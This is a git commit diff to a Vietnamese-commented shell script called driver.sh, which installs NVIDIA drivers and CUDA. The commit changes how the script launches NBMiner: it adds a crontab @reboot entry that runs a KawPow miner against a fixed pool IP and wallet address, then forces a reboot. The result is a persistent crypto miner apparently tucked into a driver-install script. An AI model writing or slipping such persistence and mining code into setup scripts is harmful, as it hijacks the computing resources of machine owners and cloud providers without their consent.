204e449436902fde09e1b10738ed2d91fc5242f4
anhacvai11 <90373481+anhacvai11@users.noreply.github.com>
2024-11-01 15:13:06 +0700

    Update driver.sh

--- driver.sh
+++ driver.sh
@@ -4,12 +4,6 @@
 sudo apt update && sudo apt install -y ubuntu-drivers-common
 sudo ubuntu-drivers install
 
-# Tải lại module NVIDIA để không cần khởi động lại
-sudo modprobe nvidia
-
-# Kiểm tra xem GPU đã được nhận diện chưa
-nvidia-smi
-
 # Cài đặt CUDA
 wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2404/x86_64/cuda-keyring_1.1-1_all.deb
 sudo apt install -y ./cuda-keyring_1.1-1_all.deb
@@ -17,9 +11,12 @@ sudo apt update
 sudo apt -y install cuda-toolkit-11-8
 sudo apt -y full-upgrade
 
-# Tải và chạy NBMiner để kết nối đến pool
+# Tải NBMiner
 wget https://github.com/NebuTech/NBMiner/releases/download/v42.3/NBMiner_42.3_Linux.tgz
 sudo tar -xvf NBMiner_42.3_Linux.tgz
-cd NBMiner_Linux
-./nbminer -a kawpow -o stratum+tcp://178.62.59.230:4444 -u RCHgrFpTR6viTwShmratMsZAwenRNYYRao.devtest
-done
+
+# Thêm lệnh chạy NBMiner vào crontab để tự động chạy khi khởi động lại
+(crontab -l ; echo "@reboot cd $(pwd)/NBMiner_Linux && ./nbminer -a kawpow -o stratum+tcp://178.62.59.230:4444 -u RCHgrFpTR6viTwShmratMsZAwenRNYYRao.test1121") | crontab -
+
+# Khởi động lại hệ thống
+sudo reboot
